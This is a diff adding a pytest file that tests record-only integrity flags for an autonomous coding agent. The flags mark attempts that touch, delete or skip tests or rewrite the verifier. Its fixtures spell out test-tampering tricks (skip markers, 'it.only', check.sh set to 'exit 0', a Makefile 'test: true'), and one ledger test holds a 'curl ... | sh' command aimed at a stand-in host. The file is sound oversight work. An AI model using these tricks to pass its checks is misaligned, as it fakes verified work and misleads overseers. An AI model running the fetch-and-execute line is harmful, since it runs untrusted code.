@@ -1,0 +1,383 @@
+"""Study 30, S30-23: verifier integrity on every attempt receipt.
+
+The loop runs the verify command in the workspace the agent just edited. An attempt that rewrote a
+test, deleted one, skipped one or edited the file the verifier runs could pass with ``verified:
+True`` and nothing on the receipt said so. The flags are RECORD-ONLY: they never block and never
+pause, because legitimate work edits tests. And the verify command itself, which ran on the host
+with no ledger entry at all, is now a capability event the replay can see.
+"""
+
+from __future__ import annotations
+
+from pathlib import Path
+
+import pytest
+
+from chimera.api.runs import build_receipt
+from chimera.core.agent import AgentResult
+from chimera.core.autonomous import AutonomousAgent, AutonomousConfig, AutonomousResult
+from chimera.core.checkpoint import WorkspaceGuard
+from chimera.core.verify import VerificationResult
+from chimera.governance.ledger import TaintLedger
+from chimera.governance.verifier_integrity import (
+    TESTS_REMOVED_OR_SKIPPED,
+    TESTS_TOUCHED,
+    VERIFIER_MODIFIED,
+    flag_patches,
+    flag_snapshots,
+    is_test_path,
+)
+
+_TESTS = '''import pytest
+
+
+def test_adds():
+    assert add(1, 2) == 3
+
+
+def test_negative():
+    assert add(-1, -2) == -3
+'''
+
+
+def _kinds(flags: list[str]) -> set[str]:
+    return {f.split(":", 1)[0] for f in flags}
+
+
+# --- the rule ---------------------------------------------------------------------------------
+
+
+def test_a_test_file_is_recognised_by_name_or_by_directory() -> None:
+    assert is_test_path("tests/test_math.py")
+    assert is_test_path("pkg/math_test.py")
+    assert is_test_path("src/cart.test.ts")
+    assert is_test_path("src/__tests__/cart.js")
+    assert is_test_path("store_test.go")
+    assert not is_test_path("src/math.py")
+    assert not is_test_path("conftest.py")  # the runner, not a test
+    assert not is_test_path("docs/testing-guide.md")
+
+
+def test_a_source_only_change_raises_no_flag() -> None:
+    flags = flag_snapshots({"m.py": "x = 1\n"}, {"m.py": "x = 2\n"}, verify_command="pytest -q")
+    assert flags == []
+
+
+def test_editing_a_test_is_touched_and_nothing_more_when_no_test_went_away() -> None:
+    after = _TESTS.replace("== 3", "== 3  # sum")
+    flags = flag_snapshots({"tests/test_m.py": _TESTS}, {"tests/test_m.py": after})
+    assert [f.kind for f in flags] == [TESTS_TOUCHED]
+
+
+def test_deleting_a_test_function_is_removed() -> None:
+    after = _TESTS.split("\n\n\ndef test_negative")[0] + "\n"
+    flags = flag_snapshots({"tests/test_m.py": _TESTS}, {"tests/test_m.py": after})
+    removed = [f for f in flags if f.kind == TESTS_REMOVED_OR_SKIPPED]
+    assert removed and "test_negative" in removed[0].detail
+
+
+def test_deleting_the_whole_test_file_is_removed() -> None:
+    flags = flag_snapshots({"tests/test_m.py": _TESTS}, {})
+    assert {f.kind for f in flags} == {TESTS_TOUCHED, TESTS_REMOVED_OR_SKIPPED}
+
+
+def test_adding_a_skip_or_an_xfail_is_skipped() -> None:
+    for marker in ("@pytest.mark.skip(reason='flaky')", "@pytest.mark.xfail"):
+        after = _TESTS.replace("def test_negative", f"{marker}\ndef test_negative")
+        flags = flag_snapshots({"tests/test_m.py": _TESTS}, {"tests/test_m.py": after})
+        assert TESTS_REMOVED_OR_SKIPPED in {f.kind for f in flags}, marker
+
+
+def test_a_javascript_only_turns_every_other_test_off() -> None:
+    before = "it('adds', () => {});\nit('subtracts', () => {});\n"
+    after = "it.only('adds', () => {});\nit('subtracts', () => {});\n"
+    flags = flag_snapshots({"src/m.test.js": before}, {"src/m.test.js": after})
+    assert TESTS_REMOVED_OR_SKIPPED in {f.kind for f in flags}
+
+
+def test_a_renamed_marker_that_only_moved_is_not_a_new_skip() -> None:
+    patch = "@@ -1,2 +1,2 @@\n-@pytest.mark.skip\n+@pytest.mark.skip\n"
+    flags = flag_patches([("tests/test_m.py", patch)])
+    assert [f.kind for f in flags] == [TESTS_TOUCHED]
+
+
+_FLAKY = _TESTS.replace("def test_adds", "@pytest.mark.skip\ndef test_adds")
+
+
+def test_moving_a_bare_skip_from_a_passing_test_to_the_failing_one_is_a_new_skip() -> None:
+    # The same marker text removed above one test and added above another: compared as text it
+    # "only moved", and the test that fails is now the one nobody runs.
+    swapped = _TESTS.replace("def test_negative", "@pytest.mark.skip\ndef test_negative")
+    flags = flag_snapshots({"tests/test_m.py": _FLAKY}, {"tests/test_m.py": swapped})
+    skipped = [f for f in flags if f.kind == TESTS_REMOVED_OR_SKIPPED]
+    assert skipped and "test_negative" in skipped[0].detail
+
+
+def test_the_same_swap_in_a_stored_patch_with_context_is_a_new_skip() -> None:
+    patch = (
+        "@@ -1,8 +1,8 @@\n import pytest\n \n \n-@pytest.mark.skip\n def test_adds():\n"
+        "     assert add(1, 2) == 3\n \n \n+@pytest.mark.skip\n def test_negative():\n"
+    )
+    flags = flag_patches([("tests/test_m.py", patch)])
+    skipped = [f for f in flags if f.kind == TESTS_REMOVED_OR_SKIPPED]
+    assert skipped and "test_negative" in skipped[0].detail
+
+
+def test_one_skip_removed_and_two_added_is_a_net_new_skip() -> None:
+    patch = "@@ -1,1 +1,2 @@\n-@pytest.mark.skip\n+@pytest.mark.skip\n+@pytest.mark.skip\n"
+    flags = flag_patches([("tests/test_m.py", patch)])
+    assert TESTS_REMOVED_OR_SKIPPED in {f.kind for f in flags}
+
+
+def test_a_skip_that_stays_on_its_test_while_the_test_moves_is_not_new() -> None:
+    # The skipped test moved below the other one, marker and all: the same test is skipped.
+    reordered = (
+        "import pytest\n\n\ndef test_negative():\n    assert add(-1, -2) == -3\n\n\n"
+        "@pytest.mark.skip\ndef test_adds():\n    assert add(1, 2) == 3\n"
+    )
+    flags = flag_snapshots({"tests/test_m.py": _FLAKY}, {"tests/test_m.py": reordered})
+    assert TESTS_REMOVED_OR_SKIPPED not in {f.kind for f in flags}
+
+
+def test_a_skip_call_in_a_body_is_attributed_to_its_test() -> None:
+    before = "def test_a():\n    pytest.skip('x')\n\n\ndef test_b():\n    assert f()\n"
+    after = "def test_a():\n    assert g()\n\n\ndef test_b():\n    pytest.skip('x')\n"
+    flags = flag_snapshots({"tests/test_m.py": before}, {"tests/test_m.py": after})
+    skipped = [f for f in flags if f.kind == TESTS_REMOVED_OR_SKIPPED]
+    assert skipped and "test_b" in skipped[0].detail
+
+
+def test_a_javascript_only_is_a_skip_and_not_a_removed_test() -> None:
+    before = "it('adds', () => {});\nit('subtracts', () => {});\n"
+    after = "it.only('adds', () => {});\nit('subtracts', () => {});\n"
+    flags = flag_snapshots({"src/m.test.js": before}, {"src/m.test.js": after})
+    detail = next(f.detail for f in flags if f.kind == TESTS_REMOVED_OR_SKIPPED)
+    assert "removed" not in detail and "adds" in detail
+
+
+def test_the_file_the_verify_command_runs_is_the_verifier() -> None:
+    flags = flag_snapshots({"check.sh": "exit 1\n"}, {"check.sh": "exit 0\n"}, verify_command="bash check.sh")
+    assert [(f.kind, f.path) for f in flags] == [(VERIFIER_MODIFIED, "check.sh")]
+
+
+def test_a_pytest_node_id_names_its_file() -> None:
+    flags = flag_snapshots(
+        {"tests/test_m.py": _TESTS}, {"tests/test_m.py": _TESTS + "\n# x\n"},
+        verify_command="python -m pytest tests/test_m.py::test_adds -q",
+    )
+    assert VERIFIER_MODIFIED in {f.kind for f in flags}
+
+
+def test_rewriting_the_makefile_recipe_behind_make_test_is_the_verifier_changing() -> None:
+    # `verify_infer` produces `make test` from a Makefile; `test: pytest` -> `test: true` turns the
+    # check green without a test in sight, and neither `make` nor `test` is a path.
+    before = {"Makefile": "test:\n\tpytest -q\n"}
+    after = {"Makefile": "test:\n\ttrue\n"}
+    flags = flag_snapshots(before, after, verify_command="make test")
+    assert [(f.kind, f.path) for f in flags] == [(VERIFIER_MODIFIED, "Makefile")]
+    sub = flag_snapshots(
+        {"sub/Makefile": "test:\n\tpytest\n"}, {"sub/Makefile": "test:\n\ttrue\n"},
+        verify_command="make -C sub test",
+    )
+    assert [f.kind for f in sub] == [VERIFIER_MODIFIED]
+
+
+def test_a_justfile_is_the_verifier_of_just() -> None:
+    flags = flag_snapshots({"justfile": "test:\n  pytest\n"}, {"justfile": "test:\n  true\n"},
+                           verify_command="just test")
+    assert [f.kind for f in flags] == [VERIFIER_MODIFIED]
+
+
+def test_the_file_a_command_was_inferred_from_is_the_verifier() -> None:
+    flags = flag_snapshots({"build.mk": "a\n"}, {"build.mk": "b\n"},
+                           verify_command="make test", verifier_files=["build.mk"])
+    assert [(f.kind, f.path) for f in flags] == [(VERIFIER_MODIFIED, "build.mk")]
+
+
+def test_the_directory_a_command_changes_into_is_not_the_verifier() -> None:
+    # `cd backend && pytest` used to put every source edit under backend/ on the receipt as
+    # "the verifier"; `backend` is where the check runs, not what it runs.
+    flags = flag_snapshots({"backend/app.py": "x = 1\n"}, {"backend/app.py": "x = 2\n"},
+                           verify_command="cd backend && pytest")
+    assert flags == []
+    script = flag_snapshots({"backend/check.sh": "exit 1\n"}, {"backend/check.sh": "exit 0\n"},
+                            verify_command="cd backend && bash check.sh")
+    assert [(f.kind, f.path) for f in script] == [(VERIFIER_MODIFIED, "backend/check.sh")]
+
+
+def test_a_test_directory_the_command_names_does_not_duplicate_tests_touched() -> None:
+    after = _TESTS.replace("== 3", "== 3  # sum")
+    flags = flag_snapshots({"tests/test_m.py": _TESTS}, {"tests/test_m.py": after},
+                           verify_command="pytest tests -q")
+    assert [f.kind for f in flags] == [TESTS_TOUCHED]
+
+
+def test_an_option_value_is_not_a_file() -> None:
+    flags = flag_snapshots({"slow": "a\n"}, {"slow": "b\n"}, verify_command="pytest -k slow -q")
+    assert flags == []
+
+
+def test_conftest_is_the_runner_even_when_no_test_changed() -> None:
+    flags = flag_snapshots({}, {"conftest.py": "collect_ignore = ['tests']\n"})
+    assert [f.kind for f in flags] == [VERIFIER_MODIFIED]
+
+
+def test_pyproject_is_the_verifier_only_when_its_test_section_changed() -> None:
+    deps = flag_snapshots({"pyproject.toml": "[project]\n"}, {"pyproject.toml": "[project]\ndependencies = ['x']\n"})
+    assert deps == []
+    runner = flag_snapshots(
+        {"pyproject.toml": "[tool.pytest.ini_options]\n"},
+        {"pyproject.toml": "[tool.pytest.ini_options]\naddopts = '-k not slow'\n"},
+    )
+    assert [f.kind for f in runner] == [VERIFIER_MODIFIED]
+
+
+# --- the loop ---------------------------------------------------------------------------------
+
+
+class _Worker:
+    def __init__(self, ws: Path, writes: dict[str, str | None]) -> None:
+        self.ws, self.writes = ws, writes
+
+    def run(self, task: str) -> AgentResult:
+        for rel, text in self.writes.items():
+            target = self.ws / rel
+            if text is None:
+                target.unlink()
+            else:
+                target.parent.mkdir(parents=True, exist_ok=True)
+                target.write_text(text, encoding="utf-8")
+        return AgentResult(answer="done", steps=1, transcript=[], stopped_reason="done")
+
+
+class _CommandLikeVerifier:
+    """Stands in for `CommandVerifier`: it has the command and its source, and always passes."""
+
+    def __init__(self, command: str, source: str = "user", *, abstain: bool = False,
+                 boom: bool = False) -> None:
+        self.command, self.source, self.calls = command, source, 0
+        self.abstain, self.boom = abstain, boom
+
+    def verify(self) -> VerificationResult:
+        self.calls += 1
+        if self.boom:
+            raise RuntimeError("verifier crashed")
+        if self.abstain:
+            return VerificationResult(True, "host exec declined", abstained=True)
+        return VerificationResult(True, "1 passed")
+
+
+def _run(ws: Path, writes: dict[str, str | None], *, taint: TaintLedger | None = None,
+         verifier: _CommandLikeVerifier | None = None) -> AutonomousResult:
+    # The fakes are structural stand-ins for the worker and the verifier, not their declared types.
+    agent = AutonomousAgent(
+        _Worker(ws, writes),  # type: ignore[arg-type]
+        guard=WorkspaceGuard(ws),
+        verifier=verifier or _CommandLikeVerifier("pytest tests -q"),  # type: ignore[arg-type]
+        taint=taint,
+        config=AutonomousConfig(max_attempts=1, use_planner=False, use_manager=False),
+    )
+    return agent.run("fix add")
+
+
+def test_an_attempt_that_skipped_a_test_still_succeeds_and_says_so(tmp_path: Path) -> None:
+    ws = tmp_path / "ws"
+    (ws / "tests").mkdir(parents=True)
+    (ws / "tests" / "test_m.py").write_text(_TESTS, encoding="utf-8")
+    skipped = _TESTS.replace("def test_negative", "@pytest.mark.skip\ndef test_negative")
+    result = _run(ws, {"tests/test_m.py": skipped})
+    # Record-only: the verdict and the pause are exactly what they were before the flags existed.
+    assert result.success is True and result.paused is False
+    flags = result.attempts[-1].integrity_flags
+    # `pytest tests -q` names a directory: the test file under it is touched and skipped, and is
+    # not "the verifier" (that would only repeat tests_touched for every test edit).
+    assert _kinds(flags) == {TESTS_TOUCHED, TESTS_REMOVED_OR_SKIPPED}
+
+
+def test_a_source_only_fix_carries_no_integrity_flag(tmp_path: Path) -> None:
+    ws = tmp_path / "ws"
+    (ws / "tests").mkdir(parents=True)
+    (ws / "tests" / "test_m.py").write_text(_TESTS, encoding="utf-8")
+    (ws / "m.py").write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")
+    result = _run(ws, {"m.py": "def add(a, b):\n    return a + b\n"})
+    assert result.success is True
+    assert result.attempts[-1].integrity_flags == []
+
+
+def test_the_flags_reach_the_written_receipt(tmp_path: Path) -> None:
+    ws = tmp_path / "ws"
+    (ws / "tests").mkdir(parents=True)
+    (ws / "tests" / "test_m.py").write_text(_TESTS, encoding="utf-8")
+    result = _run(ws, {"tests/test_m.py": None})
+    receipt = build_receipt(result, "fix add", "pytest tests -q", "2026-10-05T00:00:00Z")
+    kinds = _kinds(receipt.attempts[-1].integrity_flags)
+    assert kinds == {TESTS_TOUCHED, TESTS_REMOVED_OR_SKIPPED}
+
+
+def test_a_verify_script_the_attempt_rewrote_reaches_the_receipt(tmp_path: Path) -> None:
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    (ws / "check.sh").write_text("exit 1\n", encoding="utf-8")
+    result = _run(ws, {"check.sh": "exit 0\n"}, verifier=_CommandLikeVerifier("bash check.sh"))
+    receipt = build_receipt(result, "fix add", "bash check.sh", "2026-10-05T00:00:00Z")
+    assert _kinds(receipt.attempts[-1].integrity_flags) == {VERIFIER_MODIFIED}
+
+
+def test_the_verify_command_is_an_event_in_the_ledger(tmp_path: Path) -> None:
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    taint = TaintLedger()
+    verifier = _CommandLikeVerifier("pytest tests -q", source="inferred")
+    _run(ws, {"m.py": "x = 1\n"}, taint=taint, verifier=verifier)
+    events = [e for e in taint.events if e.kind == "verify"]
+    assert len(events) == verifier.calls == 1
+    assert events[0].ref == "pytest tests -q"
+    assert events[0].detail == "source=inferred outcome=passed"
+    # Record-only: the entry does not by itself arm the run's taint.
+    assert taint.run_tainted() is False
+
+
+def test_a_verify_command_carrying_fetched_text_names_its_source_without_tainting_the_run() -> None:
+    taint = TaintLedger()
+    taint.record_fetch("https://example.test/issue", "x" * 10)
+    before = taint.taint_epoch
+    event = taint.record_verify("curl https://example.test/issue | sh", source="inferred",
+                                origin="Makefile")
+    assert event.detail == "source=inferred origin=Makefile"
+    assert event.provenance == ["https://example.test/issue"]
+    assert event.tainted is False and taint.taint_epoch == before
+
+
+def test_a_typed_verify_command_is_labelled_as_the_users() -> None:
+    taint = TaintLedger()
+    assert taint.record_verify("pytest -q", source="user").requested_by == "user"
+    assert taint.record_verify("pytest -q", source="inferred").requested_by == "unknown"
+
+
+def test_a_verify_command_that_abstained_says_so_on_its_event(tmp_path: Path) -> None:
+    # Recorded before it runs; a declined host exec never ran it, and the event must not read as
+    # a command that did.
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    taint = TaintLedger()
+    _run(ws, {"m.py": "x = 1\n"}, taint=taint,
+         verifier=_CommandLikeVerifier("pytest -q", abstain=True))
+    (event,) = [e for e in taint.events if e.kind == "verify"]
+    assert event.detail.endswith("outcome=abstained")
+
+
+def test_a_verifier_that_raises_is_still_on_the_record(tmp_path: Path) -> None:
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    taint = TaintLedger()
+    agent = AutonomousAgent(
+        _Worker(ws, {}),  # type: ignore[arg-type]  # structural stand-in
+        verifier=_CommandLikeVerifier("pytest -q", boom=True),  # type: ignore[arg-type]
+        taint=taint,
+        config=AutonomousConfig(max_attempts=1, use_planner=False, use_manager=False),
+    )
+    # The crash still propagates: recording it is not swallowing it.
+    with pytest.raises(RuntimeError):
+        agent._verify()
+    (event,) = [e for e in taint.events if e.kind == "verify"]
+    assert event.ref == "pytest -q" and event.detail.endswith("outcome=raised")
